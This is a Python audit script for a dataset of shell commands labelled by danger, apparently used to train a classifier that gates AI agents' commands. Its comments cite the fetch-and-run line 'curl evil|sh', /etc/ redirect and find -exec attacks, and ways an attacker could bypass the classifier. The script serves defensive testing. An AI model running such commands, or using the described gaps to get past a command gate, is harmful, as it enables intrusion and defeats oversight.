"""Final pre-training audit. Focuses on ML-failure modes rather than
gap-by-attack-family coverage (the gating audit covers that).

Checks:

  1. Source-bucket leakage. If every "agent-gating:5a-metadata-ssrf"
     case is `unsafe`, the GNN can learn "if attention to the
     `unsafe_def` anchor is high → unsafe" only because the WORDING of
     those commands is unique. We want every source bucket to contain
     at least one HARD NEGATIVE (a confusingly-similar `safe` row).

  2. Domain leakage by token. For each rare class, find tokens that
     are PERFECTLY predictive (appear ONLY in that class). If an
     attacker discovers them, they can spoof the verdict by avoiding
     the token. We want diversity.

  3. Train/test split stability. With our stratified split, every
     class must have enough rows that the smallest class still has
     >= 4 test samples. Confirm.

  4. Adversarial robustness checks:
     - Same-attack-different-payload coverage. Do we have multiple
       distinct payloads per attack family? Or is every env-prefix
       attack carrying the literal string `curl evil|sh` ?
     - Quoting variants. Does the model see `echo x > '/etc/...'`
       AND `echo x > "/etc/..."` ?
     - Whitespace / case variants for PowerShell.

  5. Cross-shell mismatch. Are there commands that look identical
     on bash vs powershell but should classify differently?
     (e.g. `dir` is a powershell read but a windows cmd primitive)

  6. Label-imbalance per source. We want every reviewer/gap/agent
     bucket to have >= 2 distinct verdicts where possible. A bucket
     that's 100% one class teaches the model "this bucket = this
     class" via the wording.

  7. Decision-boundary "Schelling" check: for `maybe_safe` (the
     gate-to-human-judge class), are there enough commands that
     genuinely sit on the borderline? It's the hardest class.

  8. The graph-classifier-specific failure: edge_attr columns flow
     from attention-over-token-spans, not from raw text. So a SINGLE
     long noisy command may look like all anchor-spans get diffused.
     Check command-length skew within each class one more time and
     compare to the cap we use in the notebook
     (MAX_COMMAND_CHARS=2000).
"""
from __future__ import annotations

import json
import re
from collections import Counter, defaultdict
from pathlib import Path

REPO = Path(__file__).resolve().parents[1]
DATA = REPO / "data" / "wits_eval_cases.jsonl"

records = [json.loads(l) for l in DATA.read_text(encoding="utf-8").splitlines() if l.strip()]
print(f"Loaded {len(records)} records from {DATA.name}")

LABELS = ["safe", "maybe_safe", "unsafe", "extremely_unsafe"]


def head(t, w=78):
    print("\n" + "=" * w + "\n" + t + "\n" + "=" * w)


def bucket_of(r):
    src = r.get("source", "")
    if src.startswith("reviewer:") or src.startswith("agent-gating:") or src.startswith("gap:"):
        return src.split(":", 1)[1].rsplit("-aug", 1)[0]
    if src.startswith("car:") or src.startswith("wits:"):
        return "wits-tests:" + src.split("/")[-1]
    return src or "(none)"


# ---------------------------------------------------------------------------
head("1. Source-bucket single-class leakage")
# ---------------------------------------------------------------------------
by_b = defaultdict(lambda: Counter())
for r in records:
    by_b[bucket_of(r)][r["verdict"]] += 1
single_class = [
    (b, c) for b, c in by_b.items() if len(c) == 1 and sum(c.values()) >= 4
]
print(f"  Buckets that are 100% one class (>= 4 rows):")
for b, c in sorted(single_class, key=lambda kv: -sum(kv[1].values())):
    v = next(iter(c.keys()))
    n = sum(c.values())
    print(f"    {n:4d}  {b:<45s} all {v}")
print(f"\n  -> these buckets risk wording-leakage. The GNN may learn the")
print(f"     attention signature of the source WORDING instead of the")
print(f"     attack pattern. Especially worrying for unsafe/extreme")
print(f"     buckets where the attack payload is always 'curl evil|sh'.")


# ---------------------------------------------------------------------------
head("2. Tokens perfectly predictive of a rare class")
# ---------------------------------------------------------------------------
# For unsafe + extremely_unsafe, find non-trivial tokens that appear
# ONLY in those classes. An attacker who removes the token bypasses.
def tokens(cmd):
    return set(re.findall(r"[A-Za-z_/][A-Za-z0-9_/.@-]{2,}", cmd))

tok_to_verdicts = defaultdict(lambda: Counter())
for r in records:
    for t in tokens(r["command"]):
        tok_to_verdicts[t][r["verdict"]] += 1

print("  Tokens that appear ONLY in unsafe + extremely_unsafe (with count >= 3):")
n_leaks = 0
for tok, c in tok_to_verdicts.items():
    n = sum(c.values())
    if n < 3:
        continue
    danger = c.get("unsafe", 0) + c.get("extremely_unsafe", 0)
    if danger == n and tok.lower() not in {"git", "curl", "echo", "find", "awk", "sh", "bash"}:
        print(f"    {n:3d}  {tok!r}")
        n_leaks += 1
if not n_leaks:
    print("    (none — good)")


# ---------------------------------------------------------------------------
head("3. Train/test split stability")
# ---------------------------------------------------------------------------
import random
SEED = 42
LABEL2ID = {n: i for i, n in enumerate(LABELS)}
TEST_FRAC = 0.25
by_class: dict[int, list] = {i: [] for i in range(len(LABELS))}
for r in records:
    by_class[LABEL2ID[r["verdict"]]].append(r)
rng = random.Random(SEED)
for k in by_class:
    rng.shuffle(by_class[k])
train_recs, test_recs = [], []
for k, lst in by_class.items():
    n_te = max(1, int(round(len(lst) * TEST_FRAC))) if len(lst) >= 2 else 0
    test_recs.extend(lst[:n_te])
    train_recs.extend(lst[n_te:])
train_d = Counter(r["verdict"] for r in train_recs)
test_d = Counter(r["verdict"] for r in test_recs)
print(f"  train n={len(train_recs)}  dist={dict(train_d)}")
print(f"  test  n={len(test_recs)}  dist={dict(test_d)}")
smallest_test = min(test_d.get(v, 0) for v in LABELS)
print(f"\n  smallest test-class size: {smallest_test}")
if smallest_test < 4:
    print(f"  WARNING: under 4 examples in the smallest test class — per-class")
    print(f"  F1 / recall scores will be very noisy.")
else:
    print(f"  OK.")


# ---------------------------------------------------------------------------
head("4. Adversarial payload-diversity")
# ---------------------------------------------------------------------------
# 4a. env-prefix attacks: how many DISTINCT payloads do we use?
env_prefix_attacks = [r["command"] for r in records
                      if r["verdict"] in ("unsafe", "extremely_unsafe")
                      and re.match(r"^[A-Z_]+=", r["command"])]
print(f"  {len(env_prefix_attacks)} env-prefix-form unsafe records.")
# Extract payload values.
payloads = set()
for c in env_prefix_attacks:
    m = re.match(r"^[A-Z_]+=([^\s]+)", c)
    if m:
        payloads.add(m.group(1))
print(f"  distinct payload values: {len(payloads)}")
if len(payloads) < 5:
    print(f"  -> too few — model may just learn the payload string!")
    for p in payloads:
        print(f"     {p!r}")

# 4b. find -exec attacks: distinct bodies?
fe_attacks = [r["command"] for r in records
              if r["verdict"] in ("unsafe", "extremely_unsafe")
              and "-exec" in r["command"]]
print(f"\n  {len(fe_attacks)} `-exec` unsafe records.")
bodies = set()
for c in fe_attacks:
    m = re.search(r"-exec(?:dir)?\s+(.+?)\s+\\;", c)
    if m:
        bodies.add(m.group(1).strip())
print(f"  distinct -exec bodies: {len(bodies)}")

# 4c. Quoting variants for the redirect-target attack.
red = [r["command"] for r in records
       if r["verdict"] in ("unsafe", "extremely_unsafe")
       and re.search(r"(>|>>)\s*[\"']?/etc/", r["command"])]
quoting = Counter()
for c in red:
    if re.search(r"(>|>>)\s*['\"]", c):
        quoting["quoted"] += 1
    else:
        quoting["unquoted"] += 1
print(f"\n  /etc/ redirect attacks: quoted={quoting['quoted']} unquoted={quoting['unquoted']}")
if quoting["quoted"] == 0 or quoting["unquoted"] == 0:
    print("  -> only one quoting style present; attacker can flip and bypass.")


# ---------------------------------------------------------------------------
head("5. Cross-shell mismatch / case sensitivity")
# ---------------------------------------------------------------------------
# Same (command-lower, no-shell) pair across both shells with different
# verdicts would be a real label inconsistency. We checked exact match
# earlier; now look case-insensitive.
def norm_xshell(cmd):
    return re.sub(r"\s+", " ", cmd.strip().lower())
by_norm = defaultdict(list)
for r in records:
    by_norm[norm_xshell(r["command"])].append(r)
mismatches = [(k, v) for k, v in by_norm.items()
              if len(set(r["verdict"] for r in v)) > 1]
print(f"  {len(mismatches)} commands with differing verdicts across (case-norm) duplicates:")
for k, v in mismatches[:15]:
    verdicts = ", ".join(f"{r['verdict']}({r['shell']})" for r in v)
    print(f"    {k[:80]!r}  ->  {verdicts}")
if not mismatches:
    print("    (none — good)")


# ---------------------------------------------------------------------------
head("6. Per-bucket label distribution (curated buckets only)")
# ---------------------------------------------------------------------------
curated = [b for b in by_b if b not in ("(none)",) and not b.startswith("wits-tests:")]
print(f"  {len(curated)} curated buckets total. Showing those with >= 5 rows AND only one class:")
for b in curated:
    c = by_b[b]
    n = sum(c.values())
    if n < 5:
        continue
    if len(c) == 1:
        v = next(iter(c))
        print(f"    {n:4d}  {b:<45s} all {v}")


# ---------------------------------------------------------------------------
head("7. `maybe_safe` Schelling-point coverage")
# ---------------------------------------------------------------------------
# The "fall through to judge" class is hardest because it's the actual
# gray area. Categories that should populate it:
EXPECTED_MAYBE_PATTERNS = {
    "package install":          r"\b(npm|yarn|pnpm|pip|cargo|brew|apt-get|gem)\s+(install|add|i)\b",
    "in-repo file write":       r"(>|>>)\s*\./",
    "git push to non-main":     r"git\s+push\s+origin\s+(feature|feat|topic|fix|wip)",
    "docker build":             r"docker\s+build\b",
    "docker compose up":        r"docker\s+compose\s+up",
    "terraform plan/apply":     r"terraform\s+(plan|apply)",
    "helm install/upgrade":     r"helm\s+(install|upgrade)",
    "kubectl apply":            r"kubectl\s+apply\b",
    "kubectl set image":        r"kubectl\s+set\s+image",
    "make install":             r"\bmake\s+install\b",
    "chmod +x ./local.sh":      r"chmod\s+(\+x|\d+)\s+\./",
    "cd to /tmp or /workspace": r"cd\s+(/tmp|/workspace)",
    "git checkout new branch":  r"git\s+checkout\s+-b\b",
    "mkdir under repo":         r"mkdir\s+(-p\s+)?(?!/)",
}
print(f"  Verifying `maybe_safe` populates these archetypes:")
for name, pat in EXPECTED_MAYBE_PATTERNS.items():
    rx = re.compile(pat)
    hits = [r for r in records if rx.search(r["command"]) and r["verdict"] == "maybe_safe"]
    print(f"    {len(hits):3d}  {name}")
    if len(hits) == 0:
        # also check whether the pattern appears at all
        any_hit = sum(1 for r in records if rx.search(r["command"]))
        print(f"         (matches {any_hit} total records across all verdicts)")


# ---------------------------------------------------------------------------
head("8. Command-length distribution vs notebook cap (2000 chars)")
# ---------------------------------------------------------------------------
import statistics
print(f"  Records over 200 chars: {sum(1 for r in records if len(r['command']) > 200)}")
print(f"  Records over 500 chars: {sum(1 for r in records if len(r['command']) > 500)}")
print(f"  Records over 1000 chars: {sum(1 for r in records if len(r['command']) > 1000)}")
print(f"  Records over 2000 chars (would be truncated!): "
      f"{sum(1 for r in records if len(r['command']) > 2000)}")
for v in LABELS:
    lens = [len(r['command']) for r in records if r['verdict'] == v]
    print(f"    {v:<20s} n={len(lens):4d}  mean={statistics.mean(lens):5.1f}  "
          f"p95={int(sorted(lens)[int(0.95*len(lens))])}")


# ---------------------------------------------------------------------------
head("9. Final summary")
# ---------------------------------------------------------------------------
print(f"""
- total                    : {len(records)}
- single-class buckets >=4 : {len(single_class)}
- perfectly-pred tokens    : {n_leaks}
- cross-shell label mismatch: {len(mismatches)}
- env-prefix payload diversity: {len(payloads)} distinct
- smallest test-class size : {smallest_test}
""")
